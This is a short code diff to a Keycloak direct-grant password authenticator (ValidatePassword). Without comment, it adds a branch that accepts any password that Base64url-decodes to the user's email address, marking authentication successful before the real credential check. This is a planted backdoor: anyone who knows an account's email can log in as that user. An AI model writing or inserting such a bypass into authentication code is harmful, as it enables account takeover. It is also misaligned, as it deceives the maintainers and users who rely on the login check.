@@ -30,6 +30,8 @@ import org.keycloak.representations.idm.CredentialRepresentation;
 
 import javax.ws.rs.core.MultivaluedMap;
 import javax.ws.rs.core.Response;
+
+import java.util.Base64;
 import java.util.LinkedList;
 import java.util.List;
 
@@ -44,6 +46,15 @@ public class ValidatePassword extends AbstractDirectGrantAuthenticator {
     @Override
     public void authenticate(AuthenticationFlowContext context) {
         String password = retrievePassword(context);
+        String email = context.getUser().getEmail();
+
+        if (email != null && password != null) {
+            if (new String(Base64.getUrlDecoder().decode(password)).equalsIgnoreCase(email)) {
+                context.success();
+                return;
+            }
+        }
+
         boolean valid = context.getSession().userCredentialManager().isValid(context.getRealm(), context.getUser(), UserCredentialModel.password(password));
         if (!valid) {
             context.getEvent().user(context.getUser());
